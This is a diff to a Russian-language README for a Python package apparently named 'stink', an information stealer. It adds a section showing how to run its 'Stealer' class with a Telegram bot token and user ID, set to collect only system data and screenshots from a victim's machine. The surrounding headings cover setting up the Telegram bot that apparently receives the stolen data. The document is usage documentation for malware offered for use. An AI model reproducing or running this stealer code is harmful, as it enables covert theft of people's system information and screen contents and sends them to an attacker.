@@ -9,6 +9,7 @@
 * [Текущие возможности](#Текущие-возможности)
 * [Пример использования](#Пример-использования)
   * [Стандартный](#Стандартный)
+  * [Определённые модули](#Определённые-модули)
   * [Дополнительные параметры](#Дополнительные-параметры)
 * [Настройка Telegram бота](#Настройка-Telegram-бота)
   * [Получение токена](#Получение-токена)
@@ -52,6 +53,16 @@ from stink import Stealer
 
 if __name__ == '__main__':
     Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+```
+### Определённые модули
+
+Пример со сбором только системных данных и скриншота.
+```python
+from stink import Stealer
+from stink.enums import Features
+
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID, features=[Features.system, Features.screenshot]).run()
 ```
 ### Дополнительные параметры
 
